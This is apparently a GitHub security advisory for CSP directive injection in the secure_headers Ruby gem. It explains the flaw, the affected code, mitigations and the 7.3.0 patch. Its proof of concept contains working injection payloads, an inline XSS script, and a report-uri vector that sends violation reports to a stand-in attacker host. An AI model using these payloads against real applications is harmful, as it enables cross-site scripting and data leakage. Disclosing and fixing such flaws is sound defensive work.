# [M] Secure Headers: CSP directive injection via sandbox, plugin_types, and report_to when given untrusted input

## Summary
Severity: Medium
Advisory: GHSA-rqq5-2gf9-4w4q
CVE: CVE-2026-54163
CWE: CWE-113, CWE-79
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-rqq5-2gf9-4w4q
Type: github-advisory

## Affected
- RubyGems: `secure_headers` — affected >=0 <7.3.0

## Details
## Summary

`secure_headers` builds the `Content-Security-Policy` value by stitching every configured directive together with `; ` separators. Three directive builders (`build_sandbox_list_directive`, `build_media_type_list_directive`, `build_report_to_directive`) interpolate caller-supplied strings into that value without scrubbing `;`, `\r`, or `\n`.

When an application forwards untrusted input into `SecureHeaders.override_content_security_policy_directives` (or `append_…`) for `:sandbox`, `:plugin_types`, or `:report_to`, an attacker can embed a literal `;` and inject an arbitrary CSP directive into the header value. Because `:sandbox` and `:plugin_types` both sort alphabetically before `:script_src` in `BODY_DIRECTIVES`, the injected `script-src` lands earlier in the header and wins under the [CSP first-occurrence rule](https://www.w3.org/TR/CSP3/#parse-serialized-policy), defeating the application's real `script-src`. End result: an `'unsafe-inline' *` policy is forced for inline `<script>` despite the configured strict CSP, giving full XSS reachability anywhere reflected or stored content meets one of these three sinks.

An existing `;`/`\n` scrub is already present in the source-list builder (`build_source_list_directive`), but the three sibling builders here never received the same treatment and still emit caller bytes verbatim into the CSP value.

## Impact

Although piping untrusted input into CSP directives is generally discouraged, applications that do so for one of the three uncovered directives turn that endpoint into an XSS sink with an effective `*` `'unsafe-inline'` `script-src`, even though the global config says `script_src: %w('self')`. The same primitive can also be used to point `report-to` / `report-uri` at attacker infrastructure to silently siphon CSP violation reports — which include the violated URL, blocked-uri, source-file, line-number and a sample-snippet, useful for fingerprinting and for harvesting victim-internal URLs.

The global default CSP set in `Configuration.default` is supposed to be a backstop: even if a controller appends a single risky value, the strict `script-src` should remain the first match. This bug breaks that property by letting the appended value redefine the policy header upstream of the legitimate `script-src`.

## Affected

- **Package:** `secure_headers` (RubyGems)
- **Vulnerable versions:** `<= 7.2.0`
- **Patched version:** `7.3.0`

Applications that set `:sandbox`, `:plugin_types`, or `:report_to` only from static configuration (no per-request or per-tenant input) are not exploitable and need only the version bump. Applications that pipe any user-controlled value into one of those three directives via the per-controller override APIs are exploitable and should both upgrade and audit those code paths.

## Mitigations / Workarounds

Until upgrading to **7.3.0**, sanitize any user-controlled input before passing it to:

- `SecureHeaders.override_content_security_policy_directives`
- `SecureHeaders.append_content_security_policy_directives`
- `SecureHeaders.use_content_security_policy_named_append`

for `:sandbox`, `:plugin_types`, or `:report_to`. Reject or strip `;`, `\r`, and `\n` from values destined for these directives before they reach the gem.

## Vulnerable code

Three sibling builders all join an attacker-controllable value into the CSP header value with no `;` / `\r` / `\n` scrubbing.

- [`content_security_policy.rb#L72-L93`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/content_security_policy.rb#L72-L93) — `build_sandbox_list_directive`:

```ruby
elsif sandbox_list && sandbox_list.any?
  [
    symbol_to_hyphen_case(directive),
    sandbox_list.uniq
  ].join(" ")
end
```

- [`content_security_policy.rb#L95-L103`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/content_security_policy.rb#L95-L103) — `build_media_type_list_directive` (same pattern, for `plugin-types`).
- [`content_security_policy.rb#L105-L110`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/content_security_policy.rb#L105-L110) — `build_report_to_directive`:

```ruby
def build_report_to_directive(directive)
  return unless endpoint_name = @config.directive_value(directive)
  if endpoint_name && endpoint_name.is_a?(String) && !endpoint_name.empty?
    [symbol_to_hyphen_case(directive), endpoint_name].join(" ")
  end
end
```

For comparison, [`content_security_policy.rb#L117-L129`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/content_security_policy.rb#L117-L129) shows the source-list builder that already performs the scrub the three above are missing.

Validation also does not catch it:

- [`policy_management.rb#L361-L371`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/policy_management.rb#L361-L371) — `validate_sandbox_expression!` only checks `v.start_with?("allow-")`, so `"allow-scripts allow-same-origin; script-src 'unsafe-inline' *"` passes.
- [`policy_management.rb#L376-L385`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/policy_management.rb#L376-L385) — `validate_media_type_expression!` uses `/\A.+\/.+\z/`; `.` matches `;` and `'`, so `"application/x-foo; script-src 'unsafe-inline' *"` passes.
- [`policy_management.rb#L410-L417`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers/headers/policy_management.rb#L410-L417) — `validate_report_to_endpoint_expression!` only checks `String` + non-empty.

## Reachable

The three sinks are reached by the documented public override APIs in [`lib/secure_headers.rb#L61-L106`](https://github.com/github/secure_headers/blob/f224144c99002bcd3c06ed86c169429d4be1e5dc/lib/secure_headers.rb#L61-L106) — `override_content_security_policy_directives`, `append_content_security_policy_directives`, and `use_content_security_policy_named_append`. These are the documented per-controller hooks Rails apps use to vary CSP per request (e.g. allowing an iframe domain that a user just configured, sandboxing a per-tenant subdocument, or wiring up a per-tenant reporting endpoint).

Concrete reachable shapes:

1. Multi-tenant SaaS persisting a tenant-chosen iframe sandbox policy and replaying it via `override_content_security_policy_directives(sandbox: [tenant.sandbox_tokens])`.
2. Document / PDF viewer that allows tenants to whitelist a custom MIME via `plugin_types: [tenant.allowed_mime]`.
3. Reporting integration that lets the operator name the active reporting group through an admin UI and forwards it via `report_to: params[:report_group]`.

In all three patterns, a string field that the app expects to be a single token (`allow-forms`, `application/pdf`, `default`) is the injection point.

## Proof of concept

Pinned reproduction against a minimal Rack app on `secure_headers 7.2.0`, `rack 3.2.6`, `rackup 2.3.1`, `webrick 1.9.2`. Browser verification uses headless Chromium.

Install (Bundler):

```ruby
# Gemfile
source "https://rubygems.org"
gem "secure_headers", "= 7.2.0"
gem "rack",           "= 3.2.6"
gem "rackup",         "= 2.3.1"
gem "webrick", "= 1.9.2"
```

```bash
bundle install
```

Driver (`poc_e2e.rb`):

```ruby
require "rack"
require "webrick"
require "rackup"
require "rackup/handler/webrick"
require "secure_headers"

SecureHeaders::Configuration.default do |c|
  c.csp = {default_src: %w('self'), script_src: %w('self'), style_src: %w('self')}
end

INLINE_XSS = "<script>document.body.appendChild(Object.assign(" \
             "document.createElement('div'),{id:'pwn',innerText:" \
             "'XSS-EXECUTED via '+location.pathname}));</script>"

class App
  def call(env)
    req = Rack::Request.new(env)
    case req.path_info
    when "/sandbox"  # Vector A
      SecureHeaders.override_content_security_policy_directives(req,
        sandbox: ["allow-scripts allow-same-origin; script-src 'unsafe-inline' *"])
    when "/plugin"   # Vector B
      SecureHeaders.override_content_security_policy_directives(req,
        plugin_types: ["application/x-foo; script-src 'unsafe-inline' *"])
    when "/report"   # Vector C (report-uri exfil)
      SecureHeaders.override_content_security_policy_directives(req,
        report_to: "default; report-uri https://attacker.example/leak")
    when "/control"  # Negative — same payload on a source_list directive
      SecureHeaders.override_content_security_policy_directives(req,
        frame_src: ["'self'", "evil.example; script-src 'unsafe-inline' *"])
    end
    body = "<!doctype html>#{INLINE_XSS}"
    [200, {"content-type"=>"text/html"}.merge(SecureHeaders.header_hash_for(req)), [body]]
  end
end

Rackup::Handler::WEBrick.run(
  Rack::Builder.new { use SecureHeaders::Middleware; run App.new },
  Host: "127.0.0.1", Port: 14567, AccessLog: [], Logger: WEBrick::Log.new(nil, 0))
```

Run:

```bash
bundle exec ruby poc_e2e.rb
```

### End-to-end reproduction against `secure_headers 7.2.0`

Server-side observation (`curl -s -D - http://127.0.0.1:14567/<path>`):

```
GET /sandbox  -> content-security-policy:
    default-src 'self'; sandbox allow-scripts allow-same-origin;
    script-src 'unsafe-inline' *; script-src 'self'; style-src 'self'

GET /plugin   -> content-security-policy:
    default-src 'self'; plugin-types application/x-foo;
    script-src 'unsafe-inline' *; script-src 'self'; style-src 'self'

GET /report   -> content-security-policy:
    default-src 'self'; script-src 'self'; style-src 'self';
    report-to default; report-uri https://attacker.example/leak

GET /control  -> content-security-policy:
    default-src 'self'; frame-src 'self' evil.example  script-src
    'unsafe-inline' *; script-src 'self'; style-src 'self'
```

Browser verification (headless Chromium, `--dump-dom`, grep for the injected `id="pwn"` element which is only present if the inline `<script>` actually ran):

```
GET /sandbox  -> pwn element PRESENT  (XSS executed, injected script-src wins)
GET /plugin   -> pwn element PRESENT  (XSS executed, injected script-src wins)
GET /report   -> pwn element absent   (this vector enables report-uri exfil,
                                       not script execution by itself)
GET /control  -> pwn element absent   (existing scrub on the source-list
                                       builder rewrites ; -> space, so the
                                       legitimate `script-src 'self'` is
                                       still the first match)
```

Patched-build verification: applying the patch and re-running the same three vectors flips `/sandbox` and `/plugin` to "pwn element absent". The injected `;` is replaced with a space, so the trailing `script-src 'unsafe-inline' *` collapses into the parent directive's value list instead of becoming a sibling directive, and the legitimate `script-src 'self'` stays the first `script-src` the parser encounters.

## Patch

Shipped in **7.3.0** as a private helper that scrubs `;`, `\r`, and `\n` from every directive value, applied uniformly across the three previously-uncovered builders and the source-list builder.

Sketch of the shipped change in `lib/secure_headers/headers/content_security_policy.rb`:

```ruby
DIRECTIVE_INJECTION_REGEX = /[\n\r;]/.freeze

def scrub_directive_value(directive, value)
  str = value.to_s
  if str =~ DIRECTIVE_INJECTION_REGEX
    Kernel.warn("#{directive} contains a #{$~[0].inspect} in #{str.inspect} which will raise an error in future versions. It has been replaced with a blank space.")
    str.gsub(DIRECTIVE_INJECTION_REGEX, " ")
  else
    str
  end
end
```

The helper is invoked from each builder against the **joined** directive value (not per-token), so a single Kernel.warn is emitted per directive regardless of how many offending bytes the input contains. The same helper now also wraps the existing source-list scrub.

See the merged fix PR for the full patch and tests.

## Credit

Reported by [@tonghuaroot](https://github.com/tonghuaroot).

## Resources

- CVE-2020-5217 — prior `secure_headers` advisory for the same bug class on `build_source_list_directive` (the 2020 fix that motivated the helper this advisory extends).
- [W3C CSP Level 3 — Parse a serialized CSP](https://www.w3.org/TR/CSP3/#parse-serialized-policy) — defines the first-occurrence rule that makes the alphabetical-ordering exploit work.
- [RFC 7230 §3.2.4 — Field parsing](https://www.rfc-editor.org/rfc/rfc7230#section-3.2.4) — context for why bare `\r` / `\n` in HTTP header values are unsafe regardless of directive separator semantics.

## References
- https://github.com/github/secure_headers/security/advisories/GHSA-rqq5-2gf9-4w4q
- https://github.com/github/secure_headers
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/secure_headers/CVE-2026-54163.yml
- https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54163
